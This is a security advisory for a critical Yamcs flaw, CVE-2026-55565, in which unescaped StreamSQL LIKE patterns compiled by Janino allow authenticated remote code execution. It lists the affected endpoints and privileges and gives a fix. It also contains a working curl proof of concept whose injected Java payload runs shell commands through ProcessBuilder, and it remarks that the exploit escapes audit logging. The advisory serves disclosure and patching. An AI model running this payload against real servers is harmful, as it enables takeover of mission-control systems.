# Yamcs vulnerable to authenticated remote code execution via unescaped StreamSQL `LIKE` pattern compiled by Janino (`LikeExpression`)

- GHSA: GHSA-c64q-hj4j-375f
- CVE: CVE-2026-55565
- Published: 2026-08-28T17:30:32Z
- GHSA severity: critical
- CVSS v3.1: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (9.9)
- CWE: CWE-94
- Packages: maven:org.yamcs:yamcs-core, maven:org.yamcs:yamcs-core
- Source: https://github.com/advisories/GHSA-c64q-hj4j-375f

---

## Summary
Yamcs compiles StreamSQL query expressions to Java at runtime with Janino. The `LIKE` operator inserts the user-supplied pattern into the generated Java **unescaped**, inside a `"..."` literal, so a pattern containing `"` breaks out and injects arbitrary Java (e.g. a `static{}` block that runs an OS command when the compiled filter class loads). Result: RCE as the OS user running Yamcs.

The pattern is embedded raw whether it comes from a SQL string literal or a bound `?` argument, so the sink is reachable from any endpoint that builds a `LIKE` from user input, at routine **read-only** privileges, not just `executeSql`:
- `POST /api/archive/{instance}:executeSql` and `:streamSql` (privilege `ControlArchiving`)
- `POST /api/archive/{instance}/tables/{table}:readRows` via the `query` field (privilege `ReadTables`)
- `GET /api/archive/{instance}/events?q=` and the event export/stream variants (privilege `ReadEvents`)
- `listActivities` `q` (privilege `ReadActivities`)

The Events page search box feeds `q` directly.

Independent of the May-2026 algorithm-override RCEs (CVE-2026-46562/46621/44632): it needs none of `ChangeMissionDatabase` and is not affected by the `overrideAlgorithmsEnabled` gate.

## Details
- **Sink:** `Expression#getCompiledExpression` compiles generated source with `SimpleCompiler.cook(...)` (`Expression.java:205`) and instantiates it (`Expression.java:213`) at stream prep, before any tuple flows.
- **Injection:** `LikeExpression#fillCode_getValueReturn` (`LikeExpression.java:26`) appends `likeClause.pattern` raw into `Utils.like(<col>, "<pattern>")`. The safe sibling `ValueExpression` escapes literals via `escapeJavaString()` (`ValueExpression.java:82-85`); a review of all 35 streamsql code-generators found `LikeExpression` to be the only unescaped one.
- **Grammar:** `S_STRING = "'" (~["'"])* "'"` (`StreamSql.jj:222`) allows `"`; `getNonEscapedString` (`StreamSql.jj:36`) does not escape `"` or `\`.
- **Reachability:** `TableApi#executeSql` (`TableApi.java:399`) checks only `ControlArchiving`, then passes the raw statement to `ydb.createStatement(...)`. No SecurityManager or Janino sandbox is configured, so the compiled code can call `Runtime`/`ProcessBuilder`. `:streamSql` (`TableApi.java:447`) is equally affected.
- **The sink is reachable from several lower-privilege endpoints, not just `executeSql`.** A LIKE pattern is embedded raw whether it comes from a SQL literal or a bound `?` argument (`nextArgAsString` -> `likeClause.pattern`), so any endpoint building `... LIKE ?` with attacker input also reaches it:
  - `POST .../tables/{table}:readRows` (`TableApi.java:276`, privilege **ReadTables**): the `query` and `cols` request fields are concatenated raw into the executed StreamSQL (`sqlb.where(request.getQuery())`). Verified RCE.
  - `GET .../events?q=` (`listEvents`, EventsApi.java:79/109) and exportEvents/streamEvents (EventsApi.java:290/344), privilege **ReadEvents**: `body.message like ?` with `"%"+q+"%"`. Verified RCE.
  - `listActivities` (ActivitiesApi.java:86/113), privilege **ReadActivities**: `detail like ?` with `"%"+q+"%"`.
  `ReadTables`/`ReadEvents`/`ReadActivities` are routine read-only permissions. The single `escapeJavaString` fix below closes all of these (one sink). The raw `readRows` WHERE/cols concatenation is an additional StreamSQL-injection that should be fixed independently (validate `cols`, do not accept a free-form `query` at `ReadTables`).

## Proof of Concept
Against a Yamcs server with security enabled (default HTTP port `8090`), as a user holding only `ControlArchiving`.

```bash
BASE=http://<host>:8090
INSTANCE=<instance>

# 1. Get a token for a ControlArchiving user.
TOK=$(curl -s -X POST "$BASE/auth/token" \
  -d 'grant_type=password&username=USER&password=PASS' \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])')

# 2. Create a table with a string column.
curl -s -X POST "$BASE/api/archive/$INSTANCE:executeSql" \
  -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' \
  -d '{"statement":"create table demo(gentime timestamp, y string, primary key(gentime))"}'

# 3. Inject the LIKE pattern. It closes the generated Java string and method, adds a
#    static{} initializer that runs an OS command, then reopens a dummy method so the
#    generated class still compiles.
PATTERN='a"); } static { try { new ProcessBuilder(new String[]{"/bin/sh","-c","id > /tmp/pwned"}).start().waitFor(); } catch (Exception e) {} } public Object dummy() { return Integer.valueOf("1'
SQL="create stream pwn as select * from demo where y like '$PATTERN'"
curl -s -X POST "$BASE/api/archive/$INSTANCE:executeSql" \
  -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' \
  -d "$(python3 -c 'import sys,json;print(json.dumps({"statement":sys.argv[1]}))' "$SQL")"

# 4. Proof: the command ran as the Yamcs OS user (on the server host).
cat /tmp/pwned        # -> uid=...(...)
```
A benign `like 'abc%'` does nothing; exploitation depends on the `"` break-out.

## Impact
Arbitrary OS command execution as the Yamcs user: telecommand injection/suppression, telemetry tampering, filesystem and credential/key access, lateral movement, persistence. The attacker needs only a read-only archive privilege, not an MDB/archive-control role: the sink is reachable via `executeSql` (`ControlArchiving`), `readRows` (`ReadTables`), the events list/export/stream endpoints (`ReadEvents`), and the activities listing (`ReadActivities`).

Exploitation via `executeSql` generates no Yamcs event and is not audit-logged (the created table/stream persist and the request may appear in an HTTP access log).

## Remediation
Escape the pattern like other literals, in `LikeExpression.fillCode_getValueReturn`:
```java
code.append(", \"");
ValueExpression.escapeJavaString(likeClause.pattern, code);  // was: code.append(likeClause.pattern);
code.append("\")");
```
Defence-in-depth: pass the pattern as a bound argument instead of inlining it; audit every `cook()` path; compile generated classes under a classloader that cannot reach `Runtime`/`ProcessBuilder`.
